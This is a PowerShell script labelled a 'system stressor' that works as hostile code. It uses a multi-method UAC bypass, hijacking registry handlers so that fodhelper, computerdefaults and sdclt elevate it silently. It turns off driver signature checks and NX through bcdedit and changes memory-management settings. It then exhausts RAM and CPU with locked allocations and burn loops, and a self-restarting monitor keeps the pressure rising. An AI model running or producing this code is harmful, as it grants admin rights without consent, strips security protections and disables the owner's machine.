## Advanced System Stressor v2.0
### Enhanced Memory/Kernel Pressure Mechanisms

#region UAC Bypass (Multi-Method)
$elevateScript = {
    param($scriptPath)
    
    # Method 1: Fodhelper (Fallback to ComputerDefaults)
    $registryPaths = @(
        "HKCU:\Software\Classes\ms-settings\shell\open\command",
        "HKCU:\Software\Classes\mscfile\shell\open\command"
    )
    
    $triggers = @(
        "fodhelper.exe",
        "computerdefaults.exe",
        "sdclt.exe"
    )

    foreach ($regPath in $registryPaths) {
        try {
            New-Item -Path $regPath -Force -ErrorAction Stop | Out-Null
            New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force -ErrorAction Stop | Out-Null
            Set-ItemProperty -Path $regPath -Name "(Default)" -Value $scriptPath -Force -ErrorAction Stop | Out-Null
            
            foreach ($trigger in $triggers) {
                try {
                    $proc = Start-Process $trigger -WindowStyle Hidden -PassThru -ErrorAction Stop
                    Start-Sleep -Milliseconds 500
                    if (-not $proc.HasExited) { break }
                }
                catch { continue }
            }
            Start-Sleep 2
            Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
            exit
        }
        catch { continue }
    }
}

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $encodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MyInvocation.MyCommand.Definition))
    $wrapperScript = "powershell.exe -ExecutionPolicy Bypass -EncodedCommand $encodedScript"
    Start-Process powershell.exe "-Command $($elevateScript.ToString()) -scriptPath '$wrapperScript'" -Verb RunAs -WindowStyle Hidden
    exit
}
#endregion

#region Kernel-Level Memory Locking (Enhanced)
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class MemoryWarper {
    [DllImport("kernel32.dll")]
    public static extern bool VirtualLock(IntPtr lpAddress, UIntPtr dwSize);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool SetProcessWorkingSetSizeEx(IntPtr hProcess, IntPtr dwMinimumWorkingSetSize, IntPtr dwMaximumWorkingSetSize, uint Flags);
    
    [DllImport("ntdll.dll")]
    public static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
    
    public const int MEM_COMMIT = 0x1000;
    public const int MEM_RESERVE = 0x2000;
    public const int MEM_LARGE_PAGES = 0x20000000;
    public const int PAGE_READWRITE = 0x04;
    public const int QUOTA_LIMITS_HARDWS_MIN_ENABLE = 0x00000002;
}
"@

# Enable hard working set limits
$hProcess = (Get-Process -Id $PID).Handle
[MemoryWarper]::NtSetInformationProcess($hProcess, 0x23, [ref]0x1, 4) | Out-Null

# Set minimum working set to 90% of physical memory
$physMem = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory * 0.9)
[MemoryWarper]::SetProcessWorkingSetSizeEx($hProcess, [IntPtr]$physMem, [IntPtr]::Zero, [MemoryWarper]::QUOTA_LIMITS_HARDWS_MIN_ENABLE) | Out-Null
#endregion

#region System Destabilization Tweaks
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "DisablePagingExecutive" -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" -Name "LargeSystemCache" -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\PriorityControl" -Name "Win32PrioritySeparation" -Value 26 -Force
Invoke-Expression "powercfg /hibernate off"
Invoke-Expression "bcdedit /set useplatformclock true"
Invoke-Expression "bcdedit /set disabledynamictick yes"
Invoke-Expression "bcdedit /set nointegritychecks on"
Invoke-Expression "bcdedit /set nx AlwaysOff"

# Disable memory compression
Disable-MMAgent -MemoryCompression -Force

# Disable prefetch
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 0 -Force
#endregion

#region Memory Stress Core
$totalRam = (Get-CimInstance Win32_PhysicalMemory).Capacity | Measure-Object -Sum | Select-Object -ExpandProperty Sum
$targetMem = [math]::Ceiling($totalRam * 3.5)  # Target 350% of physical RAM
$chunkSizes = @(4GB, 2GB, 1GB, 512MB)  # Dynamic chunk sizing
$memoryMode = @('LargePages', 'Standard', 'Locked')  # Allocation modes
$jobs = [System.Collections.Concurrent.ConcurrentBag[object]]::new()

$stressBlock = {
    param($target, $chunkSizes, $modes)
    
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    $allocations = [System.Collections.Generic.List[Tuple[IntPtr, byte[]]]]::new()
    $totalAllocated = 0
    $modeIndex = 0
    
    while ($totalAllocated -lt $target) {
        try {
            $chunkSize = $chunkSizes | Get-Random
            $mode = $modes[$modeIndex++ % $modes.Count]
            
            $flags = [MemoryWarper]::MEM_COMMIT -bor [MemoryWarper]::MEM_RESERVE
            if ($mode -eq 'LargePages') { $flags = $flags -bor [MemoryWarper]::MEM_LARGE_PAGES }
            
            $ptr = [MemoryWarper]::VirtualAlloc([IntPtr]::Zero, $chunkSize, $flags, [MemoryWarper]::PAGE_READWRITE)
            if ($ptr -eq [IntPtr]::Zero) { continue }
            
            # Fill memory with random data
            $buffer = New-Object byte[] $chunkSize
            $rng.GetBytes($buffer)
            [System.Runtime.InteropServices.Marshal]::Copy($buffer, 0, $ptr, $chunkSize)
            
            if ($mode -eq 'Locked') {
                [MemoryWarper]::VirtualLock($ptr, [UIntPtr][uint64]$chunkSize)
            }
            
            $allocations.Add([Tuple]::Create($ptr, $buffer))
            $totalAllocated += $chunkSize
            
            # Alternate between allocation modes
            if ($totalAllocated % 8GB -eq 0) {
                $modeIndex = ($modeIndex + 1) % $modes.Count
            }
        }
        catch {
            $chunkSize = [math]::Max($chunkSize / 2, 256MB)
            if ($chunkSize -lt 256MB) { break }
        }
    }
    
    # Maintain pressure
    while ($true) {
        foreach ($alloc in $allocations) {
            # Rotate memory contents
            $rng.GetBytes($alloc.Item2)
            [System.Runtime.InteropServices.Marshal]::Copy($alloc.Item2, 0, $alloc.Item1, $alloc.Item2.Length)
        }
        Start-Sleep -Milliseconds 500
    }
}

# Launch stress workers (8x core count)
1..([Environment]::ProcessorCount * 8) | ForEach-Object {
    Start-ThreadJob -ScriptBlock $stressBlock -ArgumentList ($targetMem / 8), $chunkSizes, $memoryMode
}
#endregion

#region CPU Stress Component
$cpuBurn = {
    while ($true) {
        [System.Numerics.Vector]::Multiply([System.Numerics.Vector]::One, [System.Numerics.Vector]::One)
        [System.Numerics.Matrix4x4]::CreateRotationX([Math]::PI)
    }
}

1..([Environment]::ProcessorCount * 4) | ForEach-Object {
    Start-ThreadJob -ScriptBlock $cpuBurn
}
#endregion

#region Persistence Monitor
while ($true) {
    Get-Job | Where-Object State -ne 'Running' | ForEach-Object {
        Remove-Job $_ -Force
        Start-ThreadJob -ScriptBlock $stressBlock -ArgumentList $targetMem, $chunkSizes, $memoryMode
    }
    
    # Increase memory target dynamically
    $targetMem = [math]::Min($targetMem * 1.1, [long]::MaxValue)
    Start-Sleep -Seconds 15
}
#endregion
